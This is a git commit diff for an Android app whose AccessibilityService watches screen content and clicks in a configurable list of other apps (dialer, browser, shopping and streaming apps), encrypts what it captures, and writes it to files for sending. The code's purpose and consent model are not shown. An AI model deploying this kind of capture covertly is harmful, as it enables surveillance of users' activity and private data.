f27ebc9667a0c05fcf2cecab491c06398f07e69c
rohitfromearth <rohitchau115@gmail.com>
2023-01-17 19:35:18 +0530

    api app update

--- app/src/main/java/com/example/liveaction_int/Accessibilty_service.java
+++ app/src/main/java/com/example/liveaction_int/Accessibilty_service.java
@@ -9,18 +9,38 @@ import android.content.SharedPreferences;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.BatteryManager;
+import android.os.Build;
 import android.os.Environment;
+import android.os.StrictMode;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
 import androidx.core.accessibilityservice.AccessibilityServiceInfoCompat;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.lang.reflect.Array;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Calendar;
+import java.util.List;
+import java.util.Set;
+
+import javax.net.ssl.HttpsURLConnection;
 
 public class Accessibilty_service extends AccessibilityService {
 String s2="";
+    String[] appslist = new String []{};
+    ArrayList<String> appl = new ArrayList<String>();
     String must_dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath();
     String dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath() + File.separator + "lifeaction";
 FileSender fs =new FileSender();
@@ -114,6 +134,15 @@ FileSender fs =new FileSender();
 public void onServiceConnected(){
         super.onServiceConnected();
 
+        SharedPreferences sharedPreferences = getSharedPreferences("MySharedPref", MODE_PRIVATE);
+        Set<String> set = sharedPreferences.getStringSet("APP_LIST", null);
+        appl.addAll(set);
+
+
+
+
+
+
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED|AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED| AccessibilityEvent.TYPE_VIEW_CLICKED;
 //        info.eventTypes = AccessibilityEvent.TYPE_WINDOWS_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED|
@@ -132,9 +161,65 @@ public void onServiceConnected(){
 
         info.feedbackType = AccessibilityServiceInfoCompat.FEEDBACK_ALL_MASK;
         info.flags= AccessibilityServiceInfoCompat.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
+///////// api  input for application packages
+//
+//        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+//
+//        StrictMode.setThreadPolicy(policy);
+//        String[] appslist = new String []{};
+//        try {
+//            String response = "";
+//            URL url = new URL("https://3685-182-70-71-190.in.ngrok.io/apps/list");
+//            HttpURLConnection urlConn = null;
+//
+//            urlConn = (HttpURLConnection) url.openConnection();
+//            urlConn.setRequestMethod("GET");
+//            urlConn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
+//            urlConn.setRequestProperty("Accept", "application/json");
+//            Log.e("datastream","nice3");
+//            urlConn.setDoInput(true);
+//            int responseCode = urlConn.getResponseCode();
+//            if (responseCode == HttpsURLConnection.HTTP_OK) {
+//
+//                String applist;
+//                BufferedReader br = new BufferedReader(new InputStreamReader(urlConn.getInputStream()));
+//
+//                while ((applist= br.readLine()) != null) {
+//                    response += applist;
+//                    final JSONObject app = new JSONObject(response);
+////                     appslist
+//
+//
+//                    JSONArray appsList = app.getJSONArray("data");
+//                    for(int i=0;i< appsList.length();i++) {
+////                         String fg = app.get("data").getString(i);
+//                        Log.e("datastream",appsList.getString(i));
+////                         appslist[i]= appsList.getString(i);
+//                        appl.add(appsList.getString(i));
+//
+//                        Log.e("datastream", String.valueOf(appl));
+//                    }
+//
+////                    appslist= appl.toArray(appslist);
+////                    appslist
+//
+//                }
+//
+//            }
+//
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        } catch (JSONException e) {
+//            e.printStackTrace();
+//        }
+        Log.e("datastream54", String.valueOf(appl));
+        info.packageNames = appl.toArray(appslist);
+        Log.d("this is my deep array", "deep arr: " + Arrays.toString(appslist));
+//            Log.e("malfor", appslist.toString());
 
-        info.packageNames = new String[]
-                {"com.samsung.android.dialer","com.jio.media.ondemand","com.sec.android.app.launcher","com.flipkart.android","com.android.chrome","com.amazon.avod.thirdpartyclient"," com.spotify.music","com.netflix.mediaclient", "in.startv.hotstar","com.myntra.android","com.sonyliv","com.snapdeal.main","com.google.android.youtube","com.graymatrix.did","com.jio.media.jiobeats"};
+        /////
+//        info.packageNames = new String[]
+//                {"com.samsung.android.dialer","com.jio.media.ondemand","com.sec.android.app.launcher","com.flipkart.android","com.android.chrome","com.amazon.avod.thirdpartyclient"," com.spotify.music","com.netflix.mediaclient", "in.startv.hotstar","com.myntra.android","com.sonyliv","com.snapdeal.main","com.google.android.youtube","com.graymatrix.did","com.jio.media.jiobeats"};
 ////////,"com.android.systemui"/// notification class
         info.notificationTimeout = 100;
 
--- app/src/main/java/com/example/liveaction_int/Filewrite.java
+++ app/src/main/java/com/example/liveaction_int/Filewrite.java
@@ -2,12 +2,14 @@ package com.example.liveaction_int;
 
 import android.util.Log;
 
+import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.util.Calendar;
 
 public class Filewrite {
+    Encrypti er;
     public void writeFile(String data_str,String userid,Calendar c ,String dir){
         String dte = String.valueOf(c.get(Calendar.DATE));
         String mnt = String.valueOf(c.get(Calendar.MONTH) + 1);
@@ -15,12 +17,15 @@ public class Filewrite {
 
         String min = String.valueOf(c.get(Calendar.MINUTE));
         String hr = String.valueOf(c.get(Calendar.HOUR_OF_DAY));
+        er = new Encrypti();
+        String encryptedString = er.enrycpp(data_str);
+//        Log.e("file_data",file_dt);
         try {
 
             FileWriter wrt = new FileWriter(dir + File.separator + dte + "_" + mnt + "_" + yer + "_" + userid+ "_" + hr + "_" + min + ".txt", true);
-            Log.e("1234567", data_str);
+            Log.e("1234567", encryptedString);
 
-            wrt.append(data_str);
+            wrt.append(encryptedString);
             wrt.close();
 
         } catch (IOException e) {
